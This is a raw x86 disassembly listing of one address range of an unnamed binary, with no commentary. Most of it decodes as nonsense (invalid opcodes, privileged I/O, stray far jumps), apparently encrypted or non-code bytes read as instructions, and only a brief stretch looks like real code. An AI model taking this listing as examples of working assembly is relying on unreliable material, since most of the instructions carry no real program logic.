  407ac4:	test   DWORD PTR [edi],esi
  407ac6:	loop   0x407a95
  407ac8:	jae    0x407ae0
  407aca:	mov    al,ds:0xa6afb10
  407acf:	fadd   QWORD PTR [esi]
  407ad1:	cs inc edi
  407ad3:	push   0x9d94b113
  407ad8:	and    dh,BYTE PTR [ebx+0x52baac8e]
  407ade:	push   0xa307a839
  407ae3:	pusha  
  407ae4:	cmp    eax,0x79d51855
  407ae9:	xor    BYTE PTR [ecx],bh
  407aeb:	aam    0xeb
  407aed:	or     al,ch
  407aef:	dec    eax
  407af0:	inc    ebx
  407af1:	popf   
  407af2:	mov    al,ds:0x2d927f3b
  407af8:	stc    
  407af9:	rcl    DWORD PTR [edi],cl
  407afb:	or     DWORD PTR [edi+0x1310e23e],esi
  407b01:	(bad)  
  407b02:	push   edx
  407b03:	push   ebx
  407b04:	imul   edx,DWORD PTR [edi+ebx*2-0x6a],0xffffffc5
  407b09:	lock add eax,DWORD PTR [eax+0x66]
  407b0d:	dec    ebx
  407b0e:	dec    BYTE PTR [ecx-0x764261cf]
  407b14:	ds mov bl,0xe3
  407b17:	aas    
  407b18:	push   0xbe024aee
  407b1d:	or     eax,0x565392e5
  407b22:	sub    ecx,esp
  407b24:	stc    
  407b25:	jne    0x407b0a
  407b27:	xchg   DWORD PTR [edx+0x70c2b7c2],edx
  407b2d:	push   esi
  407b2e:	xchg   esp,eax
  407b2f:	retf   
  407b30:	add    eax,0xffd5a865
  407b35:	xchg   edi,eax
  407b36:	nop
  407b37:	mov    ah,0xc0
  407b39:	adc    BYTE PTR [edi-0x9],cl
  407b3c:	push   esp
  407b3d:	mov    bh,0x5a
  407b3f:	lds    edi,FWORD PTR [ebx+0x3d4a1bfc]
  407b45:	rcl    BYTE PTR [ebx+0x66e4f832],cl
  407b4b:	imul   esp,DWORD PTR [edx+0x11],0x24
  407b4f:	into   
  407b50:	cmp    eax,0x2b239599
  407b55:	add    BYTE PTR [esi+ebx*2],0xd3
  407b59:	mov    eax,ds:0x30a3069
  407b5e:	mov    al,ds:0x2a8b3734
  407b63:	ins    DWORD PTR es:[edi],dx
  407b64:	jbe    0x407af1
  407b66:	cmp    eax,0x4a03a686
  407b6b:	jl     0x407b97
  407b6d:	sar    BYTE PTR [esi],cl
  407b6f:	sub    edi,DWORD PTR [eax+0x3a8dcfbb]
  407b75:	inc    ecx
  407b76:	iret   
  407b77:	(bad)  
  407b78:	mov    bl,0x92
  407b7a:	mov    dh,BYTE PTR [eax+0x505521a5]
  407b80:	ror    BYTE PTR [ebx-0x63],1
  407b83:	sti    
  407b84:	cmp    edi,0x4e62854e
  407b8a:	pop    ebp
  407b8b:	dec    ecx
  407b8c:	inc    esp
  407b8d:	and    DWORD PTR [eax+edi*2+0x79b40105],ebx
  407b94:	retf   0xe181
  407b97:	icebp  
  407b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b99:	loop   0x407b57
  407b9b:	pop    esi
  407b9c:	or     esi,DWORD PTR ds:0x5848961d
  407ba2:	inc    ecx
  407ba3:	push   edx
  407ba4:	rcr    bl,1
  407ba6:	mov    edi,0xc23620e9
  407bab:	ja     0x407bfb
  407bad:	dec    ebp
  407bae:	scas   al,BYTE PTR es:[edi]
  407baf:	xchg   ebp,esi
  407bb1:	outs   dx,BYTE PTR ds:[esi]
  407bb2:	das    
  407bb3:	inc    ebp
  407bb4:	mov    esp,0x5f6964a
  407bb9:	test   eax,0xbf880ab3
  407bbe:	ss inc ebp
  407bc0:	rcl    ah,cl
  407bc2:	pop    es
  407bc3:	mov    esi,0xc90acb4f
  407bc8:	lock jmp 0x7b5fc2e3
  407bce:	xor    dh,BYTE PTR [edx+0x38]
  407bd1:	push   ebp
  407bd2:	jno    0x407bde
  407bd4:	xlat   BYTE PTR ds:[ebx]
  407bd5:	stos   DWORD PTR es:[edi],eax
  407bd6:	dec    DWORD PTR [eax]
  407bd8:	and    BYTE PTR [esi-0x2a],bh
  407bdb:	test   BYTE PTR [eax-0x3cdaf743],cl
  407be1:	les    esi,FWORD PTR [ebp+0x69f1e964]
  407be7:	out    dx,al
  407be8:	inc    ebx
  407be9:	ret    0x87a7
  407bec:	nop
  407bed:	and    eax,0xf82b3f43
  407bf2:	aaa    
  407bf3:	loope  0x407be2
  407bf5:	sti    
  407bf6:	fdiv   st,st(5)
  407bf8:	in     eax,0x5b
  407bfa:	pusha  
  407bfb:	cld    
  407bfc:	test   DWORD PTR [esi-0x3cef7c22],esi
  407c02:	ins    DWORD PTR es:[edi],dx
  407c03:	sub    edi,DWORD PTR [bp+di]
  407c06:	xchg   BYTE PTR [eax-0xe],dh
  407c09:	and    BYTE PTR [esi+0x68e4d8bd],cl
  407c0f:	lea    ebp,[ebp-0x6e]
  407c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c13:	jmp    0x769d1f8a
  407c18:	mov    esp,0x7f20786b
  407c1d:	ret    
  407c1e:	push   es
  407c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c20:	add    ah,BYTE PTR [eax-0x14]
  407c23:	ins    BYTE PTR es:[edi],dx
  407c24:	mov    cl,0xf3
  407c26:	cmc    
  407c27:	(bad)  
  407c29:	outs   dx,BYTE PTR ds:[esi]
  407c2a:	popa   
  407c2b:	pop    eax
  407c2c:	push   ds
  407c2d:	mov    WORD PTR [ebp-0x41c30436],gs
  407c33:	scas   eax,DWORD PTR es:[edi]
  407c34:	pop    ds
  407c35:	adc    al,0xd1
  407c37:	sbb    DWORD PTR [eax+0x19ba443c],edx
  407c3d:	icebp  
  407c3e:	int3   
  407c3f:	daa    
  407c40:	aad    0x93
  407c42:	sub    al,0x91
  407c44:	add    bl,BYTE PTR [edx+0x1112b18a]
  407c4a:	imul   edx,esp,0x962e5a34
  407c50:	push   cs
  407c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c52:	call   FWORD PTR [ecx-0x345fc776]
  407c58:	dec    edx
  407c59:	dec    DWORD PTR [ebx]
  407c5b:	stos   BYTE PTR es:[edi],al
  407c5c:	xchg   ecx,eax
  407c5d:	repz cmp al,0xd5
  407c60:	dec    esi
  407c61:	lds    eax,FWORD PTR [ebx+eiz*2-0xc]
  407c65:	(bad)  
  407c66:	std    
  407c67:	clc    
  407c68:	in     al,0xa1
  407c6a:	inc    eax
  407c6b:	mov    ebx,DWORD PTR [esi+ebx*2-0x3113ac2d]
  407c72:	bt     DWORD PTR [edi],edx
  407c75:	jno    0x407c05
  407c77:	sbb    dl,BYTE PTR [ecx]
  407c79:	call   0x272d:0xff8f9ada
  407c80:	pop    ebp
  407c81:	into   
  407c82:	sbb    eax,0x5315ee12
  407c87:	jge    0x407c6f
  407c89:	test   al,ah
  407c8b:	xlat   BYTE PTR ds:[ebx]
  407c8c:	push   eax
  407c8d:	pop    edi
  407c8e:	test   eax,0x1452b0ca
  407c93:	jle    0x407c52
  407c95:	ins    DWORD PTR es:[edi],dx
  407c96:	ficomp DWORD PTR [esi+0xf8eac06]
  407c9c:	push   edi
  407c9d:	jae    0x407c4b
  407c9f:	gs and eax,0x12334dc0
  407ca5:	sub    eax,esi
  407ca7:	dec    ebp
  407ca8:	add    eax,0x2a3391c4
  407cad:	mov    eax,0x5c8b6b35
  407cb2:	dec    edx
  407cb3:	ret    0x2957
  407cb6:	test   BYTE PTR [esi+0x6264060f],dl
  407cbc:	or     DWORD PTR [esi+0x6c],0x44890ddc
  407cc3:	xlat   BYTE PTR ds:[ebx]
  407cc4:	ror    BYTE PTR [edx],1
  407cc6:	sar    BYTE PTR ds:0x5b20948,1
  407ccc:	mov    eax,ds:0xa49844ce
  407cd1:	in     eax,0x22
  407cd3:	scas   al,BYTE PTR es:[edi]
  407cd4:	call   0xa45a:0xe995939f
  407cdb:	xor    dh,BYTE PTR [esi+edx*4]
  407cde:	mov    WORD PTR [edx-0x63],ds
  407ce1:	fucomp st(4)
  407ce3:	aas    
  407ce4:	push   cs
  407ce5:	add    esi,DWORD PTR [ebp+0x481db694]
  407ceb:	dec    esp
  407cec:	stos   DWORD PTR es:[edi],eax
  407ced:	and    eax,0x9269ae36
  407cf2:	and    al,dl
  407cf4:	dec    edi
  407cf5:	(bad)  
  407cf6:	adc    dh,BYTE PTR [ebx]
  407cf8:	popf   
  407cf9:	and    eax,DWORD PTR [eax-0xe362a05]
  407cff:	fs inc esi
  407d01:	fbstp  TBYTE PTR ds:0xdc271efd
  407d07:	sbb    BYTE PTR [ebx],0x5
  407d0a:	inc    BYTE PTR [ebx-0x16]
  407d0d:	xor    cl,dh
  407d0f:	arpl   WORD PTR cs:[esi+ecx*8-0x567cd51],cx
  407d17:	call   0xbb01f6d2
  407d1c:	adc    dh,dh
  407d1e:	sahf   
  407d1f:	dec    DWORD PTR [bp+si-0x2f92]
  407d24:	xchg   BYTE PTR [edi],dh
  407d26:	das    
  407d27:	stos   BYTE PTR es:[edi],al
  407d28:	inc    esi
  407d29:	aas    
  407d2a:	or     eax,DWORD PTR [edx-0x2f7c841d]
  407d30:	mov    cl,0x48
  407d32:	jne    0x407cbd
  407d34:	push   ebp
  407d35:	cld    
  407d36:	mov    DWORD PTR [ebp-0x30],0xba699573
  407d3d:	sbb    DWORD PTR ds:0x422982,edx
  407d43:	mov    eax,0x9c0a89d8
  407d48:	or     edx,0x5666
  407d4e:	mov    DWORD PTR [ebp-0x2c],eax
  407d51:	sub    DWORD PTR ds:0x422996,ebx
  407d57:	mov    DWORD PTR [ebp-0x20],0xba699577
  407d5e:	and    DWORD PTR ds:0x42294a,ecx
  407d64:	mov    DWORD PTR [ebp-0x1c],eax
  407d67:	mov    DWORD PTR [ebp-0x10],0xba69957b
  407d6e:	mov    DWORD PTR [ebp-0xc],eax
  407d71:	mov    DWORD PTR [ebp-0x60],0xba69957f
  407d78:	add    edx,0x428b
  407d7e:	mov    DWORD PTR [ebp-0x5c],eax
  407d81:	sbb    DWORD PTR ds:0x42289a,0x1b7d
  407d8b:	mov    eax,DWORD PTR [ebp-0x30]
  407d8e:	xor    DWORD PTR ds:0x42299a,0x1f10
  407d98:	jmp    0x408322
  407d9d:	mov    ch,0x6c
  407d9f:	or     eax,0x997014f1
  407da4:	sbb    BYTE PTR [edx-0x6b9133e9],bh
  407daa:	pop    eax
  407dab:	push   0xffffffae
  407dad:	sbb    al,0x61
  407daf:	push   ss
  407db0:	push   ss
  407db1:	cmp    eax,0x41161604
  407db6:	push   esi
  407db7:	mov    ah,0x37
  407db9:	mov    bl,0xf6
  407dbb:	xor    al,0xae
  407dbd:	pop    edi
  407dbe:	js     0x407e19
  407dc0:	daa    
  407dc1:	xor    al,0x63
  407dc3:	sbb    al,0xb4
  407dc5:	or     ah,BYTE PTR ds:0x9702c406
  407dcb:	loopne 0x407e46
  407dcd:	xor    esi,edi
  407dcf:	ror    DWORD PTR [edi],1
  407dd1:	fwait
  407dd2:	std    
  407dd3:	ficomp DWORD PTR [edx]
  407dd5:	sbb    DWORD PTR [eax],edi
  407dd7:	xor    BYTE PTR [ecx+0x7b],0x2c
  407ddb:	mov    ebx,0xba937fd7
  407de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407de1:	xor    BYTE PTR [eax+0x6a712ac7],ch
  407de7:	das    
  407de8:	mov    esp,ebx
  407dea:	lea    ecx,[ecx+0x3c]
  407ded:	(bad)  
  407dee:	mov    dl,0x99
  407df0:	sti    
  407df1:	arpl   WORD PTR [esi],di
  407df3:	sub    ebp,ebp
  407df5:	mov    dl,0x72
  407df7:	xor    BYTE PTR [eax+eiz*1+0x6c651a45],ch
  407dfe:	ret    
  407dff:	(bad)  
  407e00:	jecxz  0x407e57
  407e02:	sbb    eax,0x27b3fdbc
  407e07:	daa    
  407e08:	mov    DWORD PTR [edi-0x62],0x72557de3
  407e0f:	push   0x7cb8ab1a
  407e14:	and    al,0xc2
  407e16:	fst    DWORD PTR [eax-0x247758fc]
  407e1c:	adc    DWORD PTR [esi-0x746ebdef],ecx
  407e22:	xchg   esp,eax
  407e23:	ins    BYTE PTR es:[edi],dx
  407e24:	dec    edi
  407e25:	fisttp DWORD PTR [esi-0x14]
  407e28:	inc    eax
  407e29:	adc    bh,dh
  407e2b:	dec    edi
  407e2c:	adc    eax,0xa170b986
  407e31:	sub    eax,0xd18d32a9
  407e36:	adc    BYTE PTR [ebp+0x78],ah
  407e39:	(bad)  
  407e3a:	push   esi
  407e3b:	shr    DWORD PTR [esp+0x41],cl
  407e3f:	xor    DWORD PTR [esi-0x3e],ebx
  407e42:	imul   ecx,DWORD PTR [esi-0x46859d00],0x2d
  407e49:	fisttp QWORD PTR [esi]
  407e4b:	sbb    al,0x63
  407e4d:	inc    esi
  407e4e:	or     eax,DWORD PTR [edi]
  407e50:	lahf   
  407e51:	in     eax,dx
  407e52:	outs   dx,DWORD PTR ds:[esi]
  407e53:	sbb    esi,DWORD PTR [ebx+0x5710a51c]
  407e59:	inc    edi
  407e5a:	shl    BYTE PTR [esi+0x58015b8a],0x5c
  407e61:	dec    eax
  407e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e63:	pop    ebx
  407e64:	push   edx
  407e65:	(bad)  
  407e66:	xchg   esi,eax
  407e67:	jo     0x407e3d
  407e69:	cli    
  407e6a:	sar    BYTE PTR [edi+0x57],1
  407e6d:	push   ebp
  407e6e:	rol    DWORD PTR [edi+0x16],1
  407e71:	inc    eax
  407e72:	mov    eax,DWORD PTR [eax-0x46]
  407e75:	fs stos DWORD PTR es:[edi],eax
  407e77:	popa   
  407e78:	pop    edi
  407e79:	data16 and cl,BYTE PTR [ebx+0x470642da]
  407e80:	or     esi,esi
  407e82:	loope  0x407ed9
  407e84:	sahf   
  407e85:	fdiv   QWORD PTR [ecx]
  407e87:	stos   DWORD PTR es:[edi],eax
  407e88:	xchg   ebp,edx
  407e8a:	jo     0x407e66
  407e8c:	leave  
  407e8d:	push   ds
  407e8e:	sub    al,0xa4
  407e90:	dec    esi
  407e91:	adc    bl,BYTE PTR [eax+0x10]
  407e94:	or     BYTE PTR [edi],dl
  407e96:	sbb    edx,esi
  407e98:	stos   BYTE PTR es:[edi],al
  407e99:	mov    ds:0xfb431578,al
  407e9e:	xor    al,0x85
  407ea0:	mov    WORD PTR [edi+0x1f9b9dbf],cs
  407ea6:	fbstp  TBYTE PTR ds:[ecx+eax*2-0x50f5718b]
  407eae:	(bad)  
  407eaf:	and    DWORD PTR [ebx-0x4f],ecx
  407eb2:	bound  esi,QWORD PTR ds:0x4c2316b6
  407eb8:	adc    DWORD PTR [ecx-0x7e28c4f4],0x90323885
  407ec2:	sub    DWORD PTR [edx-0x304d1697],edx
  407ec8:	lea    ebx,[edi]
  407eca:	retf   0x52e0
  407ecd:	or     ch,BYTE PTR [ebp+edi*2-0x7ab5b5fc]
  407ed4:	push   cs
  407ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ed6:	ror    DWORD PTR [esi],0x72
  407ed9:	xchg   esi,eax
  407eda:	push   ebx
  407edb:	mov    al,0xe9
  407edd:	loope  0x407e7e
  407edf:	pop    ecx
  407ee0:	stos   DWORD PTR es:[edi],eax
  407ee1:	jmp    0x7b7f7342
  407ee6:	cdq    
  407ee7:	jmp    0x1035:0x176322ea
  407eee:	cmp    ecx,DWORD PTR [ebx+0x7d]
  407ef1:	ret    0xc3ad
  407ef4:	xor    bh,BYTE PTR ds:0x89d26a33
  407efa:	int3   
  407efb:	mov    bh,0x8f
  407efd:	scas   al,BYTE PTR es:[edi]
  407efe:	xor    al,0x56
  407f00:	loopne 0x407eae
  407f02:	aaa    
  407f03:	outs   dx,DWORD PTR ds:[esi]
  407f04:	mov    eax,0x431264b3
  407f09:	scas   al,BYTE PTR es:[edi]
  407f0a:	xor    ebp,esi
  407f0c:	sub    al,0x95
  407f0e:	jb     0x407f58
  407f10:	push   esi
  407f12:	adc    ah,BYTE PTR [eax-0x40]
  407f15:	stos   DWORD PTR es:[edi],eax
  407f16:	mov    ebp,0x82cdee22
  407f1b:	inc    edx
  407f1c:	pop    ds
  407f1d:	xor    DWORD PTR [ebx-0x5a37357e],edx
  407f23:	jg     0x407f01
  407f25:	push   esi
  407f26:	jmp    0xa1a2:0xe6206887
  407f2d:	pop    ss
  407f2e:	cmp    DWORD PTR [edx+0x6c],ebp
  407f31:	sub    al,BYTE PTR [ebp+0x2bb90e73]
  407f37:	push   ebx
  407f38:	push   edi
  407f39:	xchg   esp,eax
  407f3a:	or     DWORD PTR [ebx+0x78],esi
  407f3d:	test   esp,ecx
  407f3f:	outs   dx,DWORD PTR ds:[esi]
  407f40:	js     0x407fb2
  407f42:	inc    edx
  407f43:	aaa    
  407f44:	adc    eax,DWORD PTR [ebp+ecx*8+0x63]
  407f48:	scas   eax,DWORD PTR es:[edi]
  407f49:	mov    esp,0xe7d7e8ff
  407f4e:	push   0x72
  407f50:	mov    WORD PTR [ecx+ecx*8-0x58],fs
  407f54:	sub    dl,BYTE PTR [esi-0x1d]
  407f57:	push   ebp
  407f58:	fidivr WORD PTR [edx+eiz*4]
  407f5b:	popa   
  407f5c:	call   eax
  407f5e:	int    0xfd
  407f60:	inc    edi
  407f61:	pushf  
  407f62:	add    BYTE PTR [ebx],dh
  407f64:	outs   dx,BYTE PTR ds:[esi]
  407f65:	sbb    BYTE PTR [esi],ch
  407f67:	jb     0x407f86
  407f69:	dec    esi
  407f6a:	retf   
  407f6b:	xchg   ebx,eax
  407f6c:	mov    ecx,ebp
  407f6e:	sub    eax,0x71fab68c
  407f73:	dec    eax
  407f74:	add    eax,0xce893246
  407f79:	dec    eax
  407f7a:	inc    esp
  407f7b:	lea    ebp,[edx+0x403b9ffb]
  407f81:	cmp    eax,0xf05612a6
  407f86:	nop
  407f87:	inc    eax
  407f88:	inc    esp
  407f89:	sub    esi,DWORD PTR [ebx+ebp*8]
  407f8c:	inc    esi
  407f8d:	mov    dl,0x83
  407f8f:	pop    ebx
  407f90:	pop    ebx
  407f91:	mov    esp,0x7d79014
  407f96:	lock sub DWORD PTR [ebx+0x2f],esp
  407f9a:	cwde   
  407f9b:	mov    eax,ds:0xe2a82082
  407fa0:	(bad)  
  407fa1:	adc    DWORD PTR [edi+0x7345e4a9],ecx
  407fa7:	(bad)  
  407fa8:	cmp    ebp,esp
  407faa:	ds jne 0x407f47
  407fad:	aam    0xb6
  407faf:	outs   dx,BYTE PTR ds:[esi]
  407fb0:	mov    dh,0xbd
  407fb2:	adc    eax,0x96d2bf80
  407fb7:	dec    esi
  407fb8:	cld    
  407fb9:	cmp    eax,0x81c0a975
  407fbe:	sbb    eax,ebp
  407fc0:	das    
  407fc1:	mov    ah,0x11
  407fc3:	and    edi,ebp
  407fc5:	add    cl,dl
  407fc7:	popa   
  407fc8:	mov    edi,0x22434b97
  407fcd:	pusha  
  407fce:	xor    DWORD PTR [eax-0x47924f95],0x64111de9
  407fd8:	mov    ds:0xab09db17,al
  407fdd:	les    eax,FWORD PTR [esi]
  407fdf:	imul   esp,DWORD PTR [edx+0x560cb77a],0x80aefb5e
  407fe9:	jp     0x408023
  407feb:	loop   0x408058
  407fed:	(bad)  
  407fee:	mov    ds:0xb17ff110,al
  407ff3:	fisttp WORD PTR [edx+0x4614bb7]
  407ff9:	ret    0x2194
  407ffc:	mov    ds:0xa293935a,al
  408001:	sbb    edi,0x65
  408004:	jb     0x408025
  408006:	pop    edx
  408007:	mov    ah,0x8b
  408009:	test   DWORD PTR [ecx],ebp
  40800b:	popf   
  40800c:	test   al,0xec
  40800e:	push   sp
  408010:	clc    
  408011:	jae    0x408092
  408013:	mov    ah,0xa8
  408015:	jmp    0x8041:0x399edd68
  40801c:	rcl    ah,cl
  40801e:	sar    BYTE PTR [ebx],0x89
  408021:	out    0xd6,eax
  408023:	or     eax,0x29f93416
  408028:	jns    0x408024
  40802a:	xor    BYTE PTR [ebx+0x36],bh
  40802d:	shr    BYTE PTR [edx],cl
  40802f:	hlt    
  408030:	retf   
  408031:	dec    ecx
  408032:	mov    edx,0x5f3defde
  408037:	push   edi
  408038:	outs   dx,BYTE PTR ds:[esi]
  408039:	adc    eax,0xce335f0a
  40803e:	retf   
  40803f:	dec    ebp
  408040:	cmp    al,0x4d
  408042:	mov    ebp,0x5ab09e5f
  408047:	mov    al,ds:0x51681e50
  40804c:	mov    esi,0x7e3de9aa
  408051:	das    
  408052:	imul   eax,DWORD PTR [eax],0x70
  408055:	cmp    BYTE PTR [eax+edi*2-0x14de9646],cl
  40805c:	jne    0x407fff
  40805e:	and    bh,ah
  408060:	popa   
  408061:	inc    ch
  408063:	and    eax,0x29f4c9c2
  408068:	jbe    0x4080d3
  40806a:	pop    edx
  40806b:	iret   
  40806c:	rcl    BYTE PTR [edi+0x5d],cl
  40806f:	push   0x89fa33ea
  408074:	cli    
  408075:	push   eax
  408076:	pop    ebx
  408077:	out    0xa5,al
  408079:	cmp    esp,DWORD PTR [ebx]
  40807b:	xchg   cl,bl
  40807d:	(bad)  
  40807e:	test   esi,0x2dfbfd92
  408084:	arpl   WORD PTR [edx+0x2],sp
  408087:	(bad)  
  408089:	jmp    0x637a0cbf
  40808e:	cmp    eax,0x64c05be2
  408093:	mov    ah,0xe3
  408095:	mov    cl,0x14
  408097:	imul   edx,DWORD PTR [edx-0x10],0x754ceec7
  40809e:	xchg   ecx,eax
  40809f:	int3   
  4080a0:	jbe    0x40804b
  4080a2:	mov    al,0xa8
  4080a4:	mov    DWORD PTR [ebx+0x73230e5e],ebp
  4080aa:	daa    
  4080ab:	pop    ss
  4080ac:	inc    eax
  4080ad:	jbe    0x40812c
  4080af:	stos   BYTE PTR es:[edi],al
  4080b0:	shl    BYTE PTR [eax],0xf8
  4080b3:	push   eax
  4080b4:	mov    DWORD PTR [ecx-0x6bd66947],0x62a73cb5
  4080be:	fidivr WORD PTR [edi]
  4080c0:	sub    DWORD PTR [eax],edx
  4080c2:	xchg   esi,eax
  4080c3:	cwde   
  4080c4:	push   eax
  4080c5:	xchg   esi,eax
  4080c6:	cli    
  4080c7:	mov    al,ds:0x965e9279
  4080cc:	mov    eax,0xdf73670c
  4080d1:	mov    al,ds:0xf8021ac
  4080d6:	sub    dh,BYTE PTR [edx-0x331b3552]
  4080dc:	jmp    0xa6a8:0xfaeae250
  4080e3:	loopne 0x408163
  4080e5:	sub    eax,0x1d6063a7
  4080ea:	and    BYTE PTR [edx+0x3341d133],al
  4080f0:	push   cs
  4080f1:	push   edx
  4080f2:	push   0x84759252
  4080f7:	lea    esi,[ebx-0xfd673d8]
  4080fd:	xlat   BYTE PTR ds:[ebx]
  4080fe:	adc    ebx,edi
  408100:	aas    
  408101:	out    dx,eax
  408102:	add    edx,0x3c
  408105:	push   eax
  408106:	inc    esi
  408107:	fldcw  WORD PTR [ebp-0x1b]
  40810a:	fiadd  DWORD PTR [ecx+esi*2]
  40810d:	mov    ds,WORD PTR [ecx+edx*4-0x35779f4d]
  408114:	dec    ebp
  408115:	lds    eax,FWORD PTR [eax+0x7aeccdfa]
  40811b:	pop    ebx
  40811c:	adc    al,0x14
  40811e:	mov    edi,0x4260f103
  408123:	imul   eax,DWORD PTR [esi-0x63],0x13
  408127:	js     0x4080b8
  408129:	loope  0x408127
  40812b:	and    al,0x2a
  40812d:	jb     0x40818f
  40812f:	aad    0x44
  408131:	fisub  WORD PTR [edx]
  408133:	and    eax,0xd4ecf974
  408138:	sub    al,0xc1
  40813a:	data16 loopne 0x4080e2
  40813d:	les    eax,FWORD PTR [ebx+ebp*8]
  408140:	js     0x40815b
  408142:	cmp    ebx,ecx
  408144:	retf   
  408145:	pop    es
  408146:	mov    eax,0x6a067910
  40814b:	ds fcmovnbe st,st(4)
  40814e:	xchg   edi,eax
  40814f:	cwde   
  408150:	or     DWORD PTR [ebx-0x37bb129],0x1
  408157:	std    
  408158:	(bad)  
  408159:	jmp    0xf10f:0x224f195d
  408160:	test   DWORD PTR [edx],esp
  408162:	cmp    al,0xe9
  408164:	xchg   esp,eax
  408165:	ret    
  408166:	mov    ecx,0x39ec0b98
  40816b:	test   al,0x5f
  40816d:	xchg   ecx,eax
  40816e:	cmp    dh,BYTE PTR [edi]
  408170:	in     al,dx
  408171:	xchg   edi,eax
  408172:	in     eax,dx
  408173:	lahf   
  408174:	cs add eax,0x53f812c3
  40817a:	fld    DWORD PTR [edi+0xd]
  40817d:	cmp    ecx,DWORD PTR [ebx+0x53]
  408180:	inc    edi
  408181:	pop    esp
  408182:	dec    ecx
  408183:	push   cs
  408184:	cmp    esp,DWORD PTR [ecx+esi*2-0x4f6318f4]
  40818b:	leave  
  40818c:	test   al,0xc1
  40818e:	dec    ebp
  40818f:	dec    edx
  408190:	push   edx
  408191:	mov    al,0xb
  408193:	ror    BYTE PTR [edi],cl
  408195:	add    al,0x45
  408197:	ins    BYTE PTR es:[edi],dx
  408198:	gs jo  0x408218
  40819b:	pop    ecx
  40819c:	mov    al,0x4c
  40819e:	repz sbb BYTE PTR [edx],dh
  4081a1:	mov    cl,0x8a
  4081a3:	mov    DWORD PTR [esi+0x28319aa1],esp
  4081a9:	cdq    
  4081aa:	dec    edx
  4081ab:	sbb    BYTE PTR [esi+eax*2],ch
  4081ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081af:	std    
  4081b0:	jle    0x5dd6801c
  4081b6:	stos   DWORD PTR es:[edi],eax
  4081b7:	fwait
  4081b8:	cmp    al,0xbf
  4081ba:	mov    ecx,0xae006bd1
  4081bf:	outs   dx,DWORD PTR ds:[esi]
  4081c0:	fisttp WORD PTR [edi]
  4081c2:	inc    esi
  4081c3:	xchg   ebx,eax
  4081c4:	sub    ebp,esi
  4081c6:	out    dx,eax
  4081c7:	push   cs
  4081c8:	outs   dx,BYTE PTR ds:[esi]
  4081c9:	das    
  4081ca:	pop    ebx
  4081cb:	vcmpps xmm4,xmm3,xmm3,0xab
  4081d0:	sbb    cl,BYTE PTR [eax+eax*8-0xc49332e]
  4081d7:	cdq    
  4081d8:	inc    ecx
  4081d9:	mov    esp,0xb3184930
  4081de:	(bad)
  4081e2:	mov    dl,0xfc
  4081e4:	adc    ebp,edi
  4081e6:	sub    BYTE PTR [ecx+0x554e7c1d],ah
  4081ec:	test   DWORD PTR [eax-0x4fe20947],ecx
  4081f2:	push   esp
  4081f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081f4:	push   esp
  4081f5:	add    ebx,DWORD PTR [esi]
  4081f7:	xor    al,0xa9
  4081f9:	jmp    0x5d1fe247
  4081fe:	lahf   
  4081ff:	nop
  408200:	hlt    
  408201:	xchg   dh,dh
  408203:	in     eax,dx
  408204:	cli    
  408205:	repnz inc ebp
  408207:	jae    0x408206
  408209:	(bad)  
  40820a:	jnp    0x40822b
  40820c:	mov    ebp,0xce181a3b
  408211:	xchg   bl,bl
  408213:	retf   0x4183
  408216:	xchg   bl,ah
  408218:	rcr    BYTE PTR [esi],cl
  40821a:	pop    esi
  40821b:	adc    eax,0x3cd0d9a6
  408220:	in     eax,0x73
  408222:	out    dx,eax
  408223:	std    
  408224:	sbb    eax,0x2d8f59ce
  408229:	int3   
  40822a:	out    dx,al
  40822b:	sbb    DWORD PTR [edi],0x3a
  40822e:	jnp    0x40829f
  408230:	pop    ecx
  408231:	or     al,0xf1
  408233:	xchg   esi,eax
  408234:	(bad)  
  408235:	pop    esi
  408236:	daa    
  408237:	push   eax
  408238:	sbb    al,0x32
  40823a:	inc    edi
  40823b:	push   ecx
  40823c:	add    esp,DWORD PTR [esp+ecx*2+0x1d]
  408240:	icebp  
  408241:	lahf   
  408242:	faddp  st(2),st
  408244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408245:	mov    ah,0x1c
  408247:	fs xchg ebp,eax
  408249:	mov    eax,0xcc2a7eec
  40824e:	in     eax,0xa6
  408250:	gs int3 
  408252:	jp     0x408268
  408254:	imul   esi,DWORD PTR [edx-0x5f76a2f1],0xffffffe1
  40825b:	ins    BYTE PTR es:[di],dx
  40825d:	dec    esi
  40825e:	push   esp
  40825f:	ret    0x1ae
  408262:	test   DWORD PTR [ecx-0x16],eax
  408265:	loop   0x408203
  408267:	pop    es
  408268:	mov    ds:0x72dc2523,eax
  40826d:	push   edx
  40826e:	in     al,dx
  40826f:	xor    esi,eax
  408271:	mov    dl,BYTE PTR [edi+0x6a]
  408274:	dec    ecx
  408275:	pop    edi
  408276:	pop    eax
  408277:	xor    edi,DWORD PTR [ebp-0x5b]
  40827a:	pop    ebp
  40827b:	inc    esp
  40827c:	jbe    0x4082b5
  40827e:	jge    0x408275
  408280:	push   0x8c448fe3
  408285:	cmc    
  408286:	push   0x31e24213
  40828b:	xchg   edi,eax
  40828c:	sahf   
  40828d:	iret   
  40828e:	cld    
  40828f:	out    0xf6,eax
  408291:	mov    edx,0xa7fb165c
  408296:	test   edi,0x9feb7af6
  40829c:	jb     0x408299
  40829e:	pop    edi
  40829f:	sbb    BYTE PTR [eax],bl
  4082a1:	adc    ebx,DWORD PTR [ebp+0x1d]
  4082a4:	inc    ebp
  4082a5:	fsubr  DWORD PTR [ebx+0x1e]
  4082a8:	xor    eax,0x98b2d04d
  4082ad:	pop    edi
  4082ae:	repz fistp DWORD PTR [edx+0x48]
  4082b2:	sbb    al,0x56
  4082b4:	and    BYTE PTR [ebp-0x43],dl
  4082b7:	aaa    
  4082b8:	adc    eax,0x1c458973
  4082bd:	mov    dh,0xed
  4082bf:	shl    BYTE PTR [esi+0x35],0x56
  4082c3:	gs stos DWORD PTR es:[edi],eax
  4082c5:	popa   
  4082c6:	sbb    al,0x65
  4082c9:	ret    0xacc8
  4082cc:	pop    ecx
  4082cd:	push   ebx
  4082ce:	add    DWORD PTR [ebp-0xc],ecx
